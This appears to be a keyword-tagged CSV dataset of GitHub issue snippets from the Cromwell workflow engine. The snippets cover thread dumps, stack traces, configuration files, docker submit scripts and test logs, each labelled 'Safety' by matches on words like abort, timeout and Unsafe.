Safety,"l.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-2"" #43 prio=5 os_prio=31 tid=0x00007fb76e8ee000 nid=0x3f0b waiting on condition [0x000000012ee35000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""_jprofiler_control_sampler"" #34 daemon prio=9 os_prio=31 tid=0x00007fb771044800 nid=0x6307 waiting on condition [0x000000012ab3a000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at com.jprofiler.agent.probe.y.run(ejt:1030). ""_jprofiler_native_sample",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:34559,Unsafe,Unsafe,34559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"l.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-3"" #57 prio=5 os_prio=31 tid=0x00007fb76e95e000 nid=0x9b03 waiting on condition [0x00000001322d6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-17"" #56 daemon prio=5 os_prio=31 tid=0x00007fb76b6b6000 nid=0x9903 waiting on condition [0x0000000131db9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$C",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:19698,Unsafe,Unsafe,19698,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"l.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-4"" #60 prio=5 os_prio=31 tid=0x00007fb76d42b000 nid=0xa103 waiting on condition [0x0000000132168000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-19"" #59 daemon prio=5 os_prio=31 tid=0x00007fb770631000 nid=0x9f03 waiting on condition [0x00000001324dc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$C",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:16668,Unsafe,Unsafe,16668,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"le {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3467,Abort,Aborting,3467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,2,"['Abort', 'abort']","['Aborting', 'abort']"
Safety,licate-pairs-cloud.tsv. ```. ```; Could not localize gs://broad-dsde-methods/takuto/na12878-crsp-ice/SM-612V6.bam -> /home/lichtens/test_onco_m2/cromwell-executions/Mutect2ReplicateValidation/bf7e55a8-033b-4b36-9aa6-eeb2d77579d8/call-Mutect2/shard-11/Mutect2/0802e0bb-3231-4e14-a627-1ed839b213ae/call-CollectSequencingArtifactMetrics/inputs/broad-dsde-methods/takuto/na12878-crsp-ice/SM-612V6.bam:; gs://broad-dsde-methods/takuto/na12878-crsp-ice/SM-612V6.bam doesn't exists; null; 500 Internal Server Error; Backend Error; 500 Internal Server Error; Backend Error; at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$commandLinePreProcessor$1$$anonfun$apply$1.applyOrElse(StandardAsyncExecutionActor.scala:106); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$commandLinePreProcessor$1$$anonfun$apply$1.applyOrElse(StandardAsyncExecutionActor.scala:105); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at scala.util.Failure.recoverWith(Try.scala:203); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$commandLinePreProcessor$1.apply(StandardAsyncExecutionActor.scala:105); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$commandLinePreProcessor$1.apply(StandardAsyncExecutionActor.scala:105); at cromwell.backend.wdl.Command$.instantiate(Command.scala:27); at cromwell.backend.standard.StandardAsyncExecutionActor$class.instantiatedCommand(StandardAsyncExecutionActor.scala:198); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.standard.StandardAsyncExecutionActor$class.commandScriptContents(StandardAsyncExecutionActor.scala:170); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2011:2325,recover,recoverWith,2325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2011,1,['recover'],['recoverWith']
Safety,llo:NA:1]: Error attempting to Recover(StandardAsyncJob(projects/broad-dsde-cromwell-dev/locations/us-central1/jobs/job-7ce25791-3731-4a69-97f1-b7b65ac8ff71)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:3060,recover,recover,3060,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recover']
Safety,logs show integrity constraint violation in hsqldb when running job is aborted,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/869:71,abort,aborted,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/869,1,['abort'],['aborted']
Safety,"low-options.workflow-log-dir: ""/Volumes/Temp/E43CEE02/data/freqs/haf/base-all/w100000_2.0x/workflow-logs"". # Allows re-use of existing results for jobs you've already run; call-caching.enabled: true. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 10; # set the root directory to the run; root = ""/Volumes/Temp/E43CEE02/data/freqs/haf/base-all/w100000_2.0x/execution""; filesystems.local {; ## do not allow copy (too huge files); ## prefer hard-links, to don't remove data and kept analysis intact; localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. The log shows the following stack-trace:. ```; [2018-03-09 15:31:16,47] [error] Failed to properly flush metadata to database; java.sql.SQLException: java.lang.OutOfMemoryError: Java heap space; 	at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); 	at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); 	at org.hsqldb.jdbc.JDBCPreparedStatement.addBatch(Unknown Source); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.addBatch(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$15(JdbcActio",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:1209,timeout,timeout,1209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['timeout'],['timeout']
Safety,"low_var_refs (1 minute, 46 seconds); - should successfully run subdirectory (1 minute, 16 seconds); - should successfully run subworkflows_in_ifs (1 minute, 47 seconds); - should successfully run taskless_engine_functions (16 seconds, 277 milliseconds); - should successfully run test_file_outputs_from_input (45 seconds, 789 milliseconds); - should successfully run three_step__subwf_cwl (2 minutes, 33 seconds); - should successfully run tmp_dir (1 minute, 6 seconds); - should successfully run valid_labels (37 seconds, 78 milliseconds); - should successfully run variable_scoping (38 seconds, 77 milliseconds); - should successfully run wdl_empty_glob (46 seconds, 965 milliseconds); - should successfully run wdl_function_locations (1 minute, 37 seconds); - should successfully run workflow_engine_functions (21 seconds, 482 milliseconds); - should successfully run workflow_output_declarations (46 seconds, 853 milliseconds); - should successfully run workflow_type_and_version_wdl (40 seconds, 392 milliseconds); - should successfully run workflow_url_biscayne_sub_wfs (35 seconds, 322 milliseconds); - should successfully run workflow_url_http_relative_imports (35 seconds, 718 milliseconds); - should successfully run workflow_url_square (15 seconds, 152 milliseconds); - should successfully run workflow_url_sub_workflow_hello_world (53 seconds, 160 milliseconds); - should successfully run workflowenginefunctions (45 seconds, 630 milliseconds); - should successfully run writeToCache (1 minute, 15 seconds); - should successfully run write_lines (1 minute, 55 seconds); - should successfully run write_lines_files (3 minutes, 5 seconds); - should successfully run write_tsv (56 seconds, 21 milliseconds); - should NOT call cache the second run of call_cache_hit_prefixes_empty_hint_local !!! IGNORED !!!; - should NOT call cache the second run of call_cache_hit_prefixes_two_roots_empty_hint_cache_miss_papi !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:16517,abort,abort,16517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"m Google from https://partnerissuetracker.corp.google.com/issues/71697449:; > ------------------------------- ; > ferrara@broadinstitute.org <ferrara@broadinstitute.org> #1 Jan 8, 2018 09:25AM ; > Reported Issue; > I don't have specific numbers at this time, but over the past several weeks our production operations staff started noticing an odd behavior that we originally thought was just normal preemption. Normally we see preemption showing up as ""Error code 10: Message 14:"" - and cromwell takes care of re-submitting and following the logic coded in our WDLs. Try pre-emptibles 3 times then try a non-preemptible instance. ; > ; > cromwell metadata output:; > ; > ""message"": ""Task PairedEndSingleSampleWorkflow.SamToFastqAndBwaMemAndMba:1:1 failed. JES error code 10. Task 417bb61c-16cc-4fda-91d5-443ccba4da11:SamToFastqAndBwaMemAndMba was preempted for the 1st time. The call will be restarted with another preemptible VM (max preemptible attempts number is 3). Error code Status{code=ABORTED, description=null, cause=null}. Message: 14: VM ggp-15030877962490231612 stopped unexpectedly.""; > ; > However we have seen a new error response. ""Error code 10: Message 13"" metadata output showing:; > ; > ""message"": ""Task PairedEndSingleSampleWorkflow.HaplotypeCaller:46:3 failed. JES error code 10. Message: 13: VM ggp-9289873678241352278 shut down unexpectedly.""; > ; > From what Cromwell team indicates is that ""Message 13"" is not the same as Message 14 - as such a different logic occurs within cromwell. Cromwell will try the task three times and after that it will just ""Fail"" the task. So the ""try 3 pre-emptible then try non-preemptible"" logic is never followed.; > ; > So my question is what is ""Message 13"" and how is it different from ""Message 14""? Below are OpsIDs for a set of tasks - the first are the ""Message 14"" (which again are normal preemption but I wanted to provide some for comparison to Message 13) and the second list are the ""Message 13"". This is just a small sample of Mes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3157:1026,ABORT,ABORTED,1026,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3157,1,['ABORT'],['ABORTED']
Safety,"m; labels:; tag: Background; runInBackground: true; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; outputName: stderr; tag: Background; mounts:; - disk: local-disk; path: /cromwell_root; runInBackground: true; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; outputName: stdout; tag: Background; mounts:; - disk: local-disk; path: /cromwell_root; runInBackground: true; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ localization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Localization; timeout: 300s; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - /bin/bash /cromwell_root/gcs_localization.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Localization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:17608,timeout,timeout,17608,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"mber-of-workflow-log-copy-workers = 10. # Default number of cache read workers; #number-of-cache-read-workers = 25. io {; # throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3433,abort,abort,3433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['abort'],['abort']
Safety,"me (oligos)......done (78,222,840 bytes, 19098 pages, 0.00 sec); Pre-loading compressed genome (bits)......done (78,222,864 bytes, 19098 pages, 0.02 sec); Looking for index files in directory defuse-data/gmap/cdna; Pointers file is cdna.ref153offsets64meta; Offsets file is cdna.ref153offsets64strm; Positions file is cdna.ref153positions; Offsets compression type: bitpack64; Allocating memory for ref offset pointers, kmer 15, interval 3...Attached existing memory (2 attached) for defuse-data/gmap/cdna/cdna.ref153offsets64meta...done (134,217,744 bytes, 0.00 sec); Allocating memory for ref offsets, kmer 15, interval 3...Attached new memory for defuse-data/gmap/cdna/cdna.ref153offsets64strm...done (234,475,312 bytes, 0.23 sec); Pre-loading ref positions, kmer 15, interval 3......done (276,173,052 bytes, 0.05 sec); Starting alignment; Failed attempt to alloc 18446744073709550532 bytes; Exception: Allocation Failed raised at indexdb.c:2885; /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/log/defuse.12.sh: line 6: 7481 Segmentation fault (core dumped) /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; ; real 0m1.262s; user 0m0.046s; sys 0m0.564s. ```. Run within the docker container but not using Cromwell, the output of that command looks like this:; ```; Starting defuse command:; /usr/local/bin/gmap -D Program_required_data/deFuse/defuse-data/gmap -d cdna -f psl #<1 > #>1; Reasons:; /mnt/Workflow_runs/2_fusion_detection_tools/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa.cdna.psl m; issing; Success for defuse command:; /usr/local/bin/gmap -D Program_required_data/deFuse/defuse-data/gmap -d est4 -f psl /mnt/Workflow_runs/2_fus; ion_detection_to",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:2647,detect,detectFusions,2647,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,1,['detect'],['detectFusions']
Safety,"me typos in the instructions (e.g., `MYPASSWORD` instead of `MYSQL_PASSWORD`), it looks that there is a conectivity problem with the docker container running mysql. Steps to reproduce:. ```bash; # start mysql-server container; docker run -p 3306:3306 --name cromwell_db -e MYSQL_ROOT_PASSWORD=`cat my_sql.root.pwd` -e MYSQL_DATABASE=cromwell -e MYSQL_USER=cromwell -e MYSQL_PASSWORD=cromwell -d mysql/mysql-server:5.7; ```. The docker server is working and I can access the database using `docker exec -it cromwell_db mysql -u cromwell -p`. Adding to my configuration file:. ```; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?useSSL=false""; user = ""cromwell""; password = ""cromwell""; connectionTimeout = 5000; }; }; ```. And running locally:. ```bash; JAVA_OPTS=""-Dconfig.file=local.conf"" cromwell run --inputs inputs.json --metadata-output metadata-output.json workflow.wdl; ```. Produces the following log, which is the same even increasing the timeout:. ```; [2018-03-12 11:25:38,45] [info] Running with database db.url = jdbc:mysql://localhost/cromwell?useSSL=false; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.server.CromwellSystem.$init$(CromwellSystem.scala:24); 	at cromwell.CromwellEntryPoint$$anon$2.<init>(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.$anonfun$buildCromwellSystem$1(CromwellEntryPoint.scala:63); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.CromwellEntryPoint$.buildCromwellSystem(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:47); 	at cromwell.CommandLineParser$.runCromwell(CommandLineParser.scala:95); 	at cromwell.CommandLineParser$.delayedEndpoint$cromwell$CommandLineParser$1(CommandLineParser.scala:105); 	at cromwell.CommandLineParser$delayedInit$body.apply(CommandLineParser.scala:8); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:1151,timeout,timeout,1151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['timeout'],['timeout']
Safety,"minute delays for processing cache hits. With multiple steps in serial, this means that nothing in my pipeline starts running till 14 minutes after I start the run. Can you help me fix that?. Thank you for the help!. Happy to provide any more info than the below if that's helpful. I'm running with cromwell 84. Here's the command I'm running `java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar run workflow/expanse_workflow.wdl`. Here's my configuration (ignore the SLURM part, I'm not using it yet). Potentially important bits:; * I'm running with the local backend.; * I'm using symlink caching so that should be fast, with path+timestamp hash codes so the whole file doesn't need to be read; * I'm using the file based Hsql database. I don't see why that should matter, but maybe it does.; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # only use double quotes!; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; }. ## file based persistent database; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }. call-caching {; enabled = true; }. backend {; default = ""Local""; providers { ; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; submit = ""/usr/bin/env bash ${script}""; root = ""cromwell-executions""; filesystems {; local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hasing-strategy: [""path+modtime""]; }; }; }; }; }; SLURM {; actor-factory = 